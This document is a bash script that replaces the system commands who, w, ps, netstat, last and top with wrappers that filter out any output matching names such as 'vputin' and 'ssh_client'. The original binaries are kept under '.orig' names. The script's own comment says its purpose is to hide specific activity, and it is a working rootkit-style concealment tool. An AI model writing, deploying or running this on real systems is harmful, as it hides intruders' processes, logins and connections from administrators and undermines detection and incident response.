#!/bin/bash

FILTER_PATTERN='vyatta|uucp|mail|vputin|ssh_client'
COMMANDS_TO_WRAP=("who" "w" "ps" "netstat" "last" "top")

for cmd in "${COMMANDS_TO_WRAP[@]}"; do
   
    if ! ORIG_PATH=$(command -v "$cmd"); then
        echo "Warning: Command '$cmd' not found. Skipping."
        continue
    fi

   
    BACKUP_PATH="${ORIG_PATH}.orig"

    if [ -f "$BACKUP_PATH" ]; then
        echo "Command '$cmd' already appears to be wrapped. Skipping."
        continue
    fi


    mv "$ORIG_PATH" "$BACKUP_PATH"


    cat << EOF > "$ORIG_PATH"
#!/bin/bash
# This is a wrapper for the '$cmd' command to hide specific activity.
# The original binary is located at '$BACKUP_PATH'.

# For 'top', we must use batch mode for filtering to work.
if [[ "\$(basename "\$0")" == "top" ]]; then
    # 'exec' replaces the script process with the command process
    exec "$BACKUP_PATH" -b "\$@" | grep -E -v "$FILTER_PATTERN"
else
    exec "$BACKUP_PATH" "\$@" | grep -E -v "$FILTER_PATTERN"
fi
EOF

    # 3. Make the new wrapper script executable (copies permissions from original)
    chmod --reference="$BACKUP_PATH" "$ORIG_PATH"


done

echo "Script finished."
